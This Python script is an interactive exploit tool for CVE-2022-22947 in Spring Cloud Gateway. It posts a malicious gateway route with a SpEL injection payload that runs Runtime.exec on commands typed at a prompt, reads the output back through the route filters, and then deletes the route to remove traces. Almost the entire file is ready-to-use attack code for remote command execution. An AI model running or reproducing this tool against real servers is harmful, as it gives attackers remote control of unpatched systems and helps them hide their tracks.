# coding:utf-8
import getopt
import ssl
import sys
import urllib.request
import urllib.parse
import random
import json

#CVE-2022-22947 tools
#参考：https://www.t00ls.cc/articles-64856.html
#参考：https://www.cnblogs.com/mingforyou/p/3551199.html

command = ""
user_agent = [
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
]

uagent={"User-Agent":random.choice(user_agent),
        "Content-Type": "application/json",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*"
        }
headers={
    "Content-Type": "application/text",
    "Accept-Language": "en"
         }

ssl._create_default_https_context = ssl._create_unverified_context
url=""
route =["actuator/gateway/routes/hacktest","actuator/gateway/refresh"]
data =""


str_command=''


def request_module():
    Data = json.loads(json.dumps(data))
    request = urllib.request.Request(url+route[0],data=Data,headers=uagent,method='POST')
    response = urllib.request.urlopen(request,bytes(Data,encoding='utf8'))
    code = response.getcode()
    while code==201 :
        refresh = urllib.request.Request(url+route[1],headers=uagent,method='POST')
        res_refresh = urllib.request.urlopen(refresh)
        code = res_refresh.getcode()
        if code == 200 :
            result=urllib.request.Request(url+route[0],headers=uagent,method='GET')
            res_result = urllib.request.urlopen(result)
            json_res_result = json.loads(res_result.read())
            num_res_result = json_res_result["filters"]
            print((num_res_result[0]))
            #删除spring添加的SpEL
            del_SpEL = urllib.request.Request(url+route[0],headers=uagent,method='DELETE')
            res_del_SpEL = urllib.request.urlopen(del_SpEL)
            res_del_SpEL.read()
            del_refresh = urllib.request.Request(url + route[1], headers=uagent, method='POST')
            res_del_refresh = urllib.request.urlopen(del_refresh)
            res_del_refresh.read()

if __name__ == '__main__':
    try:
        argv = sys.argv[2:]
        args = getopt.getopt(argv, "u:")
        url=args[1][0]
    except:
        print("example SpringCloudGateway.py -u http://xxx.xxx.xxx.xx/")
    while command != "exit":
        command=input("command：")
        str_command = ""
        for i in command.split():
            str_command = str_command + '\\"' + i + '\\",'
        str_command = str_command[:-1]
        data = '''{
            "id": "hacktest",
            "filters": [{
            "name": "AddResponseHeader",
            "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{%s}).getInputStream()))}"}
            }],
            "uri": "http://example.com",
            "order": 0
        }''' % (str_command)
        if command != "exit":
            request_module()

